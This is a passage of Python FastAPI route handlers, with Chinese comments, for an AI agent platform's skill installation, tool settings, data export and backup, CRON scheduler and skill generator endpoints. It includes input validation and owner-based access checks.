    # 参数注入防护（list 形式挡 shell 注入，挡不住 flag 注入：`--target=/x` 会被当参数解析）
    if slug.startswith("-") or not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._-]{0,63}", slug):
        return JSONResponse({"error": "slug 非法（只允许字母数字与 . _ -，且不得以 - 开头）"}, status_code=400)
    import shutil, subprocess
    skillhub = shutil.which("skillhub") or os.path.expanduser("~/.local/bin/skillhub")
    if not os.path.isfile(skillhub):
        return JSONResponse({"error": "SkillHub 未安装"}, status_code=400)
    try:
        # `--` 明确结束选项解析：即使上游校验被绕过，也不再把 slug 当 flag
        r = subprocess.run([skillhub, "install", "--", slug], capture_output=True, text=True, timeout=60)
        if r.returncode != 0:
            return JSONResponse({"error": "安装失败: %s" % (r.stderr or r.stdout)}, status_code=400)
        return {"status": "installed", "name": slug}
    except subprocess.TimeoutExpired:
        return JSONResponse({"error": "安装超时"}, status_code=504)
    except OSError as e:
        # `os.path.isfile` 挡不住"存在但不可执行"（Windows 上 ~/.local/bin/skillhub 就是这种）：
        # 此前只捕 TimeoutExpired → 其它 OSError 直接冒成 500（未捕获路径）。
        return JSONResponse(
            {"error": f"SkillHub 无法执行（{type(e).__name__}）：检查它是否为可执行文件"}, status_code=400)


# ─── Tools Config API ───

@router.get("/v1/tools/{name}")
async def get_tool_detail(name: str):
    try:
        from agent_harness.core.tools.registry import TOOL_REGISTRY
        entry = TOOL_REGISTRY.get(name)
        if not entry:
            return JSONResponse({"error": "工具不存在"}, status_code=404)
        return {
            "name": name,
            "description": entry["schema"].get("description", ""),
            "privilege": entry.get("privilege", "read-only"),
            "category": entry.get("category", ""),
            "properties": list(entry["schema"].get("properties", {}).keys()),
            "enabled": is_tool_enabled(name),
        }
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


@router.post("/v1/tools/{name}/toggle")
async def toggle_tool_endpoint(request: Request, name: str):
    if _capability_denied("global_toggle"):
        return JSONResponse({"error": "演示模式禁止修改全局工具开关"}, status_code=403)
    try:
        new_state = _toggle_tool(name)
        return {"name": name, "enabled": new_state}
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


@router.get("/v1/plugins")
async def list_plugins():
    skills = _scan_skills()
    disabled_tools = _list_disabled_tools()
    return {"skills": skills, "disabled_tools": disabled_tools, "total_skills": len(skills)}


# ─── Diagnostics API ───

@router.get("/v1/diag/search")
async def search_diagnostics():
    try:
        from agent_harness.core.tools.web import _SEARCH_DIAG
        return {"diag": _SEARCH_DIAG, "count": len(_SEARCH_DIAG)}
    except (ImportError, AttributeError):
        return {"diag": [], "count": 0}


# ─── Data Export API ───

import io
import zipfile


@router.get("/v1/export/sessions")
async def export_sessions(request: Request):
    if _capability_denied("export_all_data"):
        return JSONResponse({"error": "演示模式禁止导出全部数据（自托管不受影响）"}, status_code=403)
    user = getattr(request.state, "user", None)
    is_admin = user and user.get("role") == "admin"
    owner_filter = None if is_admin else (user.get("id", "") if user else "")
    sessions = _list_sessions(owner_id=owner_filter)
    data = []
    for s in sessions:
        msgs = _load_session(s["id"])
        if msgs:
            data.append({"session_id": s["id"], "messages": msgs, "meta": s})
    return StreamingResponse(
        iter([json.dumps(data, ensure_ascii=False, indent=2)]),
        media_type="application/json",
        headers={"Content-Disposition": "attachment; filename=sessions_export.json"},
    )


@router.get("/v1/export/reports")
async def export_reports(request: Request):
    if _capability_denied("export_all_data"):
        return JSONResponse({"error": "演示模式禁止导出全部数据（自托管不受影响）"}, status_code=403)
    user = getattr(request.state, "user", None)
    is_admin = bool(user and user.get("role") == "admin")
    owner_filter = None if is_admin else ((user or {}).get("id", ""))
    # 经 store 读取并带 owner 过滤。旧实现算出了 owner_filter 却从未使用，
    # 非 admin 导出到了全量报告（含他人）。
    rs = _get_rs()
    metas = rs.list_reports(limit=10 ** 6, offset=0, owner_id=owner_filter)
    data = []
    for meta in metas:
        full = rs.get_report(meta.get("id", ""), owner_id=owner_filter) or {}
        data.append({**meta, "content": full.get("content", "")})
    return StreamingResponse(
        iter([json.dumps(data, ensure_ascii=False, indent=2)]),
        media_type="application/json",
        headers={"Content-Disposition": "attachment; filename=reports_export.json"},
    )


@router.get("/v1/export/backup")
async def export_backup(request: Request):
    if _capability_denied("export_all_data"):
        return JSONResponse({"error": "演示模式禁止导出全部数据（自托管不受影响）"}, status_code=403)
    user = getattr(request.state, "user", None)
    if not user or user.get("role") != "admin":
        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        sessions = _list_sessions()
        sessions_data = []
        for s in sessions:
            msgs = _load_session(s["id"])
            if msgs:
                sessions_data.append({"id": s["id"], "messages": msgs})
        zf.writestr("sessions.json", json.dumps(sessions_data, ensure_ascii=False, indent=2))
        from agent_harness.apps.research.pipeline.report_store import REPORTS_DIR as _RD
        from agent_harness.apps.research.pipeline.report_store import _load_index
        index = _load_index()
        reports_data = []
        for meta in index:
            fp = _RD / meta.get("filename", "")
            content = fp.read_text("utf-8") if fp.exists() else ""
            reports_data.append({**meta, "content": content})
        zf.writestr("reports.json", json.dumps(reports_data, ensure_ascii=False, indent=2))
        # auth.db（全部账号密码哈希）不进备份包：备份端口导出的是数据，
        # 不是凭据库。此前 role=user 一个 GET 就能把它连同全部会话一起拖走。
    buf.seek(0)
    return StreamingResponse(
        iter([buf.getvalue()]),
        media_type="application/zip",
        headers={"Content-Disposition": f"attachment; filename=lingShu_backup_{int(time.time())}.zip"},
    )


# ─── Scheduler (CRON) API ───

@router.get("/v1/scheduler/tasks")
async def scheduler_list_tasks(request: Request):
    user = getattr(request.state, "user", None)
    if not user or user.get("role") != "admin":
        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
    return {"tasks": _cron_list(), "count": len(_cron_list())}


@router.post("/v1/scheduler/tasks")
async def scheduler_create_task(request: Request):
    user = getattr(request.state, "user", None)
    if not user or user.get("role") != "admin":
        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
    body = await request.json()
    task_id = (body.get("id", "") or "").strip()
    schedule = (body.get("schedule", "") or "").strip()
    prompt = (body.get("prompt", "") or "").strip()
    if not task_id or not schedule:
        return JSONResponse({"error": "缺少 id 或 schedule 参数"}, status_code=400)
    try:
        task = _cron_add(task_id, schedule, prompt)
        return {"status": "created", "task": task}
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)


@router.get("/v1/scheduler/tasks/{task_id}")
async def scheduler_get_task(task_id: str, request: Request):
    user = getattr(request.state, "user", None)
    if not user or user.get("role") != "admin":
        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
    task = _cron_get(task_id)
    if task is None:
        return JSONResponse({"error": "任务不存在"}, status_code=404)
    return {"task": task}


@router.post("/v1/scheduler/tasks/{task_id}")
async def scheduler_update_task(task_id: str, request: Request):
    user = getattr(request.state, "user", None)
    if not user or user.get("role") != "admin":
        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
    body = await request.json()
    try:
        task = _cron_update(task_id, **body)
        if task is None:
            return JSONResponse({"error": "任务不存在"}, status_code=404)
        return {"status": "updated", "task": task}
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)


@router.delete("/v1/scheduler/tasks/{task_id}")
async def scheduler_delete_task(task_id: str, request: Request):
    user = getattr(request.state, "user", None)
    if not user or user.get("role") != "admin":
        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
    if _cron_delete(task_id):
        return {"status": "deleted"}
    return JSONResponse({"error": "任务不存在"}, status_code=404)


# ─── Plugins API ───

@router.get("/v1/plugins/loaded")
async def plugin_list():
    return {"plugins": _plugin_list(), "count": len(_plugin_list())}

@router.post("/v1/knowledge/import")
async def kb_import_memory(request: Request):
    """跨产品记忆导入 — 从外部 AI 文本提取知识点并存入知识库"""
    body = await request.json()
    text = (body or {}).get("text", "")
    source = (body or {}).get("source", "")
    collection = _user_collection(request, (body or {}).get("collection", "memory"))
    if not text:
        return JSONResponse({"error": "缺少 text 参数"}, status_code=400)
    try:
        from agent_harness.core.tools.misc import _tool_memory_import
        result = _tool_memory_import(text, source=source, collection=collection)
        return JSONResponse(content=json.loads(result))
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)
@router.post("/v1/skills/generate")
async def skill_generate(request: Request):
    """对话式 Skill 生成器 — NL 描述 → Skill.md → 安装"""
    if _capability_denied("write_host_state"):
        return JSONResponse({"error": "演示模式禁止生成并安装技能"}, status_code=403)
    body = await request.json()
    description = (body or {}).get("description", "").strip()
    name = (body or {}).get("name", "").strip() or None
    if not description:
        return JSONResponse({"error": "缺少 description 参数"}, status_code=400)
    try:
        from agent_harness.core.tools.skill_generator import generate_skill
        result = generate_skill(description, name=name)
        return JSONResponse(content=result)
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)

@router.get("/v1/skills/generate/templates")
async def skill_templates():
    """列出可用的 Skill 模板"""
    return {"templates": [
        {"id": "search", "name": "搜索技能", "desc": "集成搜索 API 并返回结构化结果"},
        {"id": "analysis", "name": "分析技能", "desc": "对输入数据执行分析并生成报告"},
        {"id": "automation", "name": "自动化技能", "desc": "执行多步自动化操作"},
        {"id": "custom", "name": "自定义", "desc": "从零定义"},
    ]}

